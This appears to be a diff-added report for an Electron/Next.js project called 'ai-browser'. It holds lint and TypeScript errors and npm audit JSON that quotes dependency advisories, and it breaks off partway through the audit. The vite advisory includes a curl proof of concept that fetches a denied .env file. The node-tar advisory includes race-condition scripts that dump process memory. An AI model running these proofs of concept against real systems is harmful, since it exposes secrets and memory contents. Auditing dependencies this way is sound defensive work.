@@ -1,0 +1,731 @@
+Project: ai-browser
+
+--- ESLint --fix ---
+
+> ai-browser@0.0.13 lint /Users/albsheralsadi/ai_emulators/ai-browser
+> next lint --silent --fix
+
+error: unknown option '--silent'
+(Did you mean --file?)
+ ELIFECYCLE  Command failed with exit code 1.
+ ⚠ Warning: Found multiple lockfiles. Selecting /Users/albsheralsadi/pnpm-lock.yaml.
+   Consider removing the lockfiles at:
+   * /Users/albsheralsadi/ai_emulators/ai-browser/pnpm-lock.yaml
+
+
+./src/components/AgentConfigModal.tsx
+223:69  Error: `'` can be escaped with `&apos;`, `&lsquo;`, `&#39;`, `&rsquo;`.  react/no-unescaped-entities
+
+./src/hooks/useEventListeners.ts
+90:35  Error: A `require()` style import is forbidden.  @typescript-eslint/no-require-imports
+
+./src/pages/main.tsx
+27:19  Error: React Hook "useTranslation" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+28:38  Error: React Hook "App.useApp" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+29:20  Error: React Hook "useRouter" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+52:9  Error: React Hook "useTaskManager" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+55:90  Error: React Hook "useHistoryStore" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+59:22  Error: React Hook "useTaskPlayback" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+94:9  Error: React Hook "useToolHistory" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+101:50  Error: React Hook "useScroll" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+109:31  Error: React Hook "useState" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+110:41  Error: React Hook "useState" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+111:43  Error: React Hook "useState" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+118:34  Error: React Hook "useMemo" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+125:23  Error: React Hook "useRef" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+126:33  Error: React Hook "useRef" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+127:28  Error: React Hook "useRef" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+136:9  Error: React Hook "useTaskHandlers" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+153:9  Error: React Hook "useMessageHandlers" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+178:9  Error: React Hook "useInteractionHandlers" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+192:29  Error: React Hook "useTaskExecution" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+206:5  Error: React Hook "useEventListeners" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+220:40  Error: React Hook "useCallback" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+278:5  Error: React Hook "useEffect" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+284:5  Error: React Hook "useEffect" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+289:5  Error: React Hook "useEffect" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+305:5  Error: React Hook "useEffect" is called in function "main" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word "use".  react-hooks/rules-of-hooks
+
+./src/services/task-storage.ts
+272:13  Warning: Expected an assignment or function call and instead saw an expression.  @typescript-eslint/no-unused-expressions
+
+info  - Need to disable some ESLint rules? Learn more here: https://nextjs.org/docs/app/api-reference/config/eslint#disabling-rules
+
+--- Format (prettier) ---
+ ERR_PNPM_NO_SCRIPT  Missing script: format
+
+Command "format" not found.
+
+--- Type Check (tsc --noEmit) ---
+src/components/chat/AtomicFragmentRenderer.tsx(3,10): error TS2459: Module '"@/utils/messageFlattener"' declares 'AtomicMessageFragment' locally, but it is not exported.
+src/components/chat/AtomicFragmentRenderer.tsx(49,11): error TS2322: Type 'unknown' is not assignable to type 'AtomicMessageFragment[]'.
+src/hooks/useHistoryPlayback.ts(3,27): error TS2459: Module '"@/utils/messageFlattener"' declares 'AtomicMessageFragment' locally, but it is not exported.
+src/utils/capture.ts(103,37): error TS2769: No overload matches this call.
+  Overload 1 of 2, '(sw: number, sh: number, settings?: ImageDataSettings | undefined): ImageData', gave the following error.
+    Argument of type 'Uint8ClampedArray<ArrayBufferLike>' is not assignable to parameter of type 'number'.
+  Overload 2 of 2, '(data: ImageDataArray, sw: number, sh?: number | undefined, settings?: ImageDataSettings | undefined): ImageData', gave the following error.
+    Argument of type 'Uint8ClampedArray<ArrayBufferLike>' is not assignable to parameter of type 'ImageDataArray'.
+      Type 'ArrayBufferLike' is not assignable to type 'ArrayBuffer'.
+        Type 'SharedArrayBuffer' is missing the following properties from type 'ArrayBuffer': resizable, resize, detached, transfer, transferToFixedLength
+src/components/chat/AtomicFragmentRenderer.tsx(3,10): error TS2459: Module '"@/utils/messageFlattener"' declares 'AtomicMessageFragment' locally, but it is not exported.
+src/components/chat/AtomicFragmentRenderer.tsx(49,11): error TS2322: Type 'unknown' is not assignable to type 'AtomicMessageFragment[]'.
+src/hooks/useHistoryPlayback.ts(3,27): error TS2459: Module '"@/utils/messageFlattener"' declares 'AtomicMessageFragment' locally, but it is not exported.
+src/utils/capture.ts(103,37): error TS2769: No overload matches this call.
+  Overload 1 of 2, '(sw: number, sh: number, settings?: ImageDataSettings | undefined): ImageData', gave the following error.
+    Argument of type 'Uint8ClampedArray<ArrayBufferLike>' is not assignable to parameter of type 'number'.
+  Overload 2 of 2, '(data: ImageDataArray, sw: number, sh?: number | undefined, settings?: ImageDataSettings | undefined): ImageData', gave the following error.
+    Argument of type 'Uint8ClampedArray<ArrayBufferLike>' is not assignable to parameter of type 'ImageDataArray'.
+      Type 'ArrayBufferLike' is not assignable to type 'ArrayBuffer'.
+        Type 'SharedArrayBuffer' is missing the following properties from type 'ArrayBuffer': resizable, resize, detached, transfer, transferToFixedLength
+
+--- npm audit (json) ---
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1109463,
+          "path": ".>@tailwindcss/postcss>@tailwindcss/oxide>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "tar",
+      "target": "7.5.2",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1109801,
+          "path": ".>ts-jest>jest>@jest/core>jest-config>babel-jest>babel-plugin-istanbul>@istanbuljs/load-nyc-config>js-yaml",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": null,
+      "target": null,
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1109802,
+          "path": ".>@eslint/eslintrc>js-yaml",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "js-yaml",
+      "target": "4.1.1",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1111093,
+          "path": ".>react-markdown>mdast-util-to-hast",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "mdast-util-to-hast",
+      "target": "13.2.1",
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "xmldom",
+      "resolves": [
+        {
+          "id": 1091573,
+          "path": ".>xmldom",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        },
+        {
+          "id": 1096547,
+          "path": ".>xmldom",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "electron",
+      "resolves": [
+        {
+          "id": 1107272,
+          "path": ".>electron",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "vite",
+      "resolves": [
+        {
+          "id": 1109137,
+          "path": ".>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "glob",
+      "resolves": [
+        {
+          "id": 1109842,
+          "path": ".>electron-builder>app-builder-lib>config-file-ts>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1109843,
+          "path": ".>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "next",
+      "resolves": [
+        {
+          "id": 1111377,
+          "path": ".>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111386,
+          "path": ".>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1091573": {
+      "findings": [
+        {
+          "version": "0.6.0",
+          "paths": [
+            ".>xmldom"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-crh6-fp67-6883\n- https://github.com/xmldom/xmldom/releases/tag/0.7.7\n- https://github.com/xmldom/xmldom/releases/tag/0.8.4\n- https://github.com/xmldom/xmldom/releases/tag/0.9.0-beta.4\n- https://nvd.nist.gov/vuln/detail/CVE-2022-39353\n- https://github.com/jindw/xmldom/issues/150\n- https://lists.debian.org/debian-lts-announce/2023/01/msg00000.html\n- https://github.com/xmldom/xmldom/commit/52a708360c35aa160fcca8621720d71fd0f95f1a\n- https://github.com/xmldom/xmldom/commit/7ff7c10ab2961703ac1752e95b4ff60ee4ee6643\n- https://github.com/xmldom/xmldom/commit/c02f786216bed70825f9a351c65e61500f51e931\n- https://github.com/advisories/GHSA-crh6-fp67-6883",
+      "created": "2022-11-01T17:29:11.000Z",
+      "id": 1091573,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nxmldom parses XML that is not well-formed because it contains multiple top level elements, and adds all root nodes to the `childNodes` collection of the `Document`, without reporting any error or throwing.\nThis breaks the assumption that there is only a single root node in the tree, which led to https://nvd.nist.gov/vuln/detail/CVE-2022-39299 and is a potential issue for dependents.\n\n### Patches\nUpdate to `@xmldom/xmldom@~0.7.7`, `@xmldom/xmldom@~0.8.4` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.4` (dist-tag `next`).\n\n### Workarounds\nOne of the following approaches might help, depending on your use case:\n- Instead of searching for elements in the whole DOM, only search in the `documentElement`.\n- Reject a document with a document that has more then 1 `childNode`.\n\n### References\n- https://nvd.nist.gov/vuln/detail/CVE-2022-39299\n- https://github.com/jindw/xmldom/issues/150\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@xmldom.org\n",
+      "reported_by": null,
+      "title": "xmldom allows multiple root nodes in a DOM",
+      "metadata": null,
+      "cves": [
+        "CVE-2022-39353"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "xmldom",
+      "vulnerable_versions": "<=0.6.0",
+      "github_advisory_id": "GHSA-crh6-fp67-6883",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2023-03-31T16:06:26.000Z",
+      "cvss": {
+        "score": 9.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-1288"
+      ],
+      "url": "https://github.com/advisories/GHSA-crh6-fp67-6883"
+    },
+    "1096547": {
+      "findings": [
+        {
+          "version": "0.6.0",
+          "paths": [
+            ".>xmldom"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-5fg8-2547-mr8q\n- https://nvd.nist.gov/vuln/detail/CVE-2021-32796\n- https://github.com/xmldom/xmldom/commit/7b4b743917a892d407356e055b296dcd6d107e8b\n- https://www.npmjs.com/package/@xmldom/xmldom\n- https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities\n- https://mattermost.com/blog/securing-xml-implementations-across-the-web\n- https://github.com/advisories/GHSA-5fg8-2547-mr8q",
+      "created": "2021-08-03T16:57:05.000Z",
+      "id": 1096547,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nxmldom versions 0.6.0 and older do not correctly escape special characters when serializing elements removed from their ancestor. This may lead to unexpected syntactic changes during XML processing in some downstream applications.\n\n### Patches\nUpdate to one of the fixed versions of `@xmldom/xmldom` (`>=0.7.0`)\n\nSee issue #271 for the status of publishing `xmldom` to npm or join #270 for Q&A/discussion until it's resolved.\n\n### Workarounds\n\nDownstream applications can validate the input and reject the maliciously crafted documents.\n\n### References\n\nSimilar to this one reported on the Go standard library:\n\n- https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/\n- https://mattermost.com/blog/securing-xml-implementations-across-the-web/\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [`xmldom/xmldom`](https://github.com/xmldom/xmldom)\n* Email us: send an email to **all** addresses that are shown by `npm owner ls @xmldom/xmldom`\n",
+      "reported_by": null,
+      "title": "Misinterpretation of malicious XML input",
+      "metadata": null,
+      "cves": [
+        "CVE-2021-32796"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "xmldom",
+      "vulnerable_versions": "<=0.6.0",
+      "github_advisory_id": "GHSA-5fg8-2547-mr8q",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2024-02-22T19:03:29.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-5fg8-2547-mr8q"
+    },
+    "1107272": {
+      "findings": [
+        {
+          "version": "33.4.11",
+          "paths": [
+            ".>electron"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/electron/electron/security/advisories/GHSA-vmqv-hx8q-j7mg\n- https://github.com/electron/electron/pull/48101\n- https://github.com/electron/electron/pull/48102\n- https://github.com/electron/electron/pull/48103\n- https://github.com/electron/electron/pull/48104\n- https://github.com/electron/electron/commit/23a02934510fcf951428e14573d9b2d2a3c4f28b\n- https://github.com/electron/electron/commit/2e5a0b7220ebf955c6785cc5adb2e2b1cf77dac1\n- https://github.com/electron/electron/commit/3f92511cdecc39f46b0e86cce40a0c691e301c9d\n- https://github.com/electron/electron/commit/fdf29ce83870109d403f5c23ae529dbd0e8f4fee\n- https://nvd.nist.gov/vuln/detail/CVE-2025-55305\n- https://github.com/advisories/GHSA-vmqv-hx8q-j7mg",
+      "created": "2025-09-03T21:27:37.000Z",
+      "id": 1107272,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nThis only impacts apps that have the `embeddedAsarIntegrityValidation` and `onlyLoadAppFromAsar` [fuses](https://www.electronjs.org/docs/latest/tutorial/fuses) enabled.  Apps without these fuses enabled are not impacted.\n\nSpecifically this issue can only be exploited if your app is launched from a filesystem the attacker has write access too.  i.e. the ability to edit files inside the `resources` folder in your app installation on Windows which these fuses are supposed to protect against.\n\n### Workarounds\nThere are no app side workarounds, you must update to a patched version of Electron.\n\n### Fixed Versions\n* `38.0.0-beta.6`\n* `37.3.1`\n* `36.8.1`\n* `35.7.5`\n\n### For more information\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)",
+      "reported_by": null,
+      "title": "Electron has ASAR Integrity Bypass via resource modification",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-55305"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "electron",
+      "vulnerable_versions": "<35.7.5",
+      "github_advisory_id": "GHSA-vmqv-hx8q-j7mg",
+      "recommendation": "Upgrade to version 35.7.5 or later",
+      "patched_versions": ">=35.7.5",
+      "updated": "2025-09-05T16:10:11.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:H/A:L"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-829"
+      ],
+      "url": "https://github.com/advisories/GHSA-vmqv-hx8q-j7mg"
+    },
+    "1109137": {
+      "findings": [
+        {
+          "version": "7.1.10",
+          "paths": [
+            ".>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-93m4-6634-74q7\n- https://github.com/vitejs/vite/commit/f479cc57c425ed41ceb434fecebd63931b1ed4ed\n- https://nvd.nist.gov/vuln/detail/CVE-2025-62522\n- https://github.com/advisories/GHSA-93m4-6634-74q7",
+      "created": "2025-10-20T19:54:28.000Z",
+      "id": 1109137,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nFiles denied by [`server.fs.deny`](https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with `\\` when the dev server is running on Windows.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the dev server on Windows\n\n### Details\n`server.fs.deny` can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns). These patterns were able to bypass by using a back slash(`\\`). The root cause is that `fs.readFile('/foo.png/')` loads `/foo.png`.\n\n### PoC\n```shell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" > .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n```\n<img width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" />",
+      "reported_by": null,
+      "title": "vite allows server.fs.deny bypass via backslash on Windows",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-62522"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.1.0 <=7.1.10",
+      "github_advisory_id": "GHSA-93m4-6634-74q7",
+      "recommendation": "Upgrade to version 7.1.11 or later",
+      "patched_versions": ">=7.1.11",
+      "updated": "2025-10-21T14:51:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-93m4-6634-74q7"
+    },
+    "1109463": {
+      "findings": [
+        {
+          "version": "7.5.1",
+          "paths": [
+            ".>@tailwindcss/postcss>@tailwindcss/oxide>tar"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-29xp-372q-xqph\n- https://github.com/isaacs/node-tar/issues/445\n- https://github.com/isaacs/node-tar/pull/446\n- https://github.com/isaacs/node-tar/commit/5e1a8e638600d3c3a2969b4de6a6ec44fa8d74c9\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64118\n- https://github.com/isaacs/node-tar/commit/5330eb04bc43014f216e5c271b40d5c00d45224d\n- https://github.com/advisories/GHSA-29xp-372q-xqph",
+      "created": "2025-10-30T17:13:17.000Z",
+      "id": 1109463,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nUsing `.t` (aka `.list`) with `{ sync: true }` to read tar entry contents returns uninitialized memory contents if tar file was changed on disk to a smaller size while being read.\n\n### Details\n\nSee:\n* https://github.com/isaacs/node-tar/issues/445\n* https://github.com/isaacs/node-tar/pull/446\n* Regression happened in https://github.com/isaacs/node-tar/commit/5330eb04bc43014f216e5c271b40d5c00d45224d\n\n### PoC\n\nA:\n```js\nimport * as tar from 'tar'\nimport fs from 'node:fs'\n\nfs.writeFileSync('tar.test.tmp', Buffer.alloc(1*1024))\n\n// from readme\nconst filesAdded = []\ntar.c(\n  {\n    sync: true,\n    file: 'tar.test.tmp.tar',\n    onWriteEntry(entry) {\n      // initially, it's uppercase and 0o644\n      console.log('adding', entry.path, entry.stat.mode.toString(8))\n      // make all the paths lowercase\n      entry.path = entry.path.toLowerCase()\n      // make the entry executable\n      entry.stat.mode = 0o755\n      // in the archive, it's lowercase and 0o755\n      filesAdded.push([entry.path, entry.stat.mode.toString(8)])\n    },\n  },\n  ['./tar.test.tmp'],\n)\n\nconst a = fs.readFileSync('tar.test.tmp.tar')\n\nfor (let i = 0; ; i++){\n  if (i % 10000 === 0) console.log(i)\n  fs.writeFileSync('tar.test.tmp.tar', a)\n  fs.truncateSync('tar.test.tmp.tar', 600)\n}\n```\n\nB (vulnerable):\n```js\nimport * as tar from 'tar'\nimport * as fs from 'fs'\n\nwhile (true) {\n  fs.readFileSync(import.meta.filename)\n  tar.t({\n    sync: true,\n    file: 'tar.test.tmp.tar',\n    onReadEntry: e => e.on('data', b => {\n      const a = b.filter(x => x)\n      if (a.length > 0) console.log(a.toString())\n    })\n  })\n}\n```\n\nRun A and B in parallel on Node.js 22 or >=25.1.0\n\nDumps `B` memory (wait for some time to observe text data)\n\n### Impact\n\nExposes process memory and could result in e.g. unintentionally (aka attacker-controlled) attempting to process sensitive data rather than tar entry contents. Uninitialized memory can contain unrelated file contents, environment variables, passwords, etc.\n\nTo execute, an attacker must reduce the file size to boundary between a tar header and body block, in the time between when the tar archive file size is read via `stat`, and the time when the tar archive parser reaches the entry that is truncated. If the file is truncated at a different boundary, then the uninitialized data will very likely not be a valid tar entry, causing the parser to treat the entry as a damaged archive (that is, throwing an error in `strict: true` mode, or by default, skipping the entry harmlessly).\n\nThis is conditional on using the `sync: true` option to the `tar.list`/`tar.t` method, and the `7.5.1` version specifically. Earlier versions were not affected.\n\nThis is also conditional to attacker being able to truncate (or induce a truncation/replacement) of a file on disk (e.g. in cache).\n\nIf the tar file is initially larger than the `opt.maxReadSize` (16kb by default), then uninitialized memory is not exposed to user code, and instead the program enters an infinite loop, causing a DoS rather than an information disclosure vulnerability.\n\nBy default, `tar.list` does _not_ process tar archive entry body content. So, this is further conditional on the user code doing something with the tar entry file contents in an `onReadEntry` method which would expose the file contents (for example, attempting to parse them in such a way that the uninitialized data could appear in an error message).\n\nOther methods in this library (`tar.extract`, etc.) are not affected by this vulnerability.",
+      "reported_by": null,
+      "title": "node-tar has a race condition leading to uninitialized memory exposure",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64118"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "tar",
+      "vulnerable_versions": "=7.5.1",
+      "github_advisory_id": "GHSA-29xp-372q-xqph",
+      "recommendation": "Upgrade to version 7.5.2 or later",
+      "patched_versions": ">=7.5.2",
+      "updated": "2025-10-30T19:53:35.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-362"
+      ],
+      "url": "https://github.com/advisories/GHSA-29xp-372q-xqph"
+    },
+    "1109801": {
+      "findings": [
+        {
+          "version": "3.14.1",
+          "paths": [
+            ".>ts-jest>jest>@jest/core>jest-config>babel-jest>babel-plugin-istanbul>@istanbuljs/load-nyc-config>js-yaml"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64718\n- https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879\n- https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266\n- https://github.com/advisories/GHSA-mh29-5h37-fv8m",
+      "created": "2025-11-14T14:29:48.000Z",
+      "id": 1109801,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+      "reported_by": null,
+      "title": "js-yaml has prototype pollution in merge (<<)",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64718"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "js-yaml",
+      "vulnerable_versions": "<3.14.2",
+      "github_advisory_id": "GHSA-mh29-5h37-fv8m",
+      "recommendation": "Upgrade to version 3.14.2 or later",
+      "patched_versions": ">=3.14.2",
+      "updated": "2025-11-17T15:20:44.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-mh29-5h37-fv8m"
+    },
+    "1109802": {
+      "findings": [
+        {
+          "version": "4.1.0",
+          "paths": [
+            ".>@eslint/eslintrc>js-yaml"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64718\n- https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879\n- https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266\n- https://github.com/advisories/GHSA-mh29-5h37-fv8m",
+      "created": "2025-11-14T14:29:48.000Z",
+      "id": 1109802,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+      "reported_by": null,
+      "title": "js-yaml has prototype pollution in merge (<<)",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64718"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "js-yaml",
+      "vulnerable_versions": ">=4.0.0 <4.1.1",
+      "github_advisory_id": "GHSA-mh29-5h37-fv8m",
+      "recommendation": "Upgrade to version 4.1.1 or later",
+      "patched_versions": ">=4.1.1",
+      "updated": "2025-11-17T15:20:44.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-mh29-5h37-fv8m"
+    },
+    "1109842": {
+      "findings": [
+        {
+          "version": "10.4.5",
+          "paths": [
+            ".>electron-builder>app-builder-lib>config-file-ts>glob"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2\n- https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64756\n- https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f\n- https://github.com/advisories/GHSA-5j98-mcp5-4vw2",
+      "created": "2025-11-17T17:38:56.000Z",
+      "id": 1109842,
+      "npm_advisory_id": null,
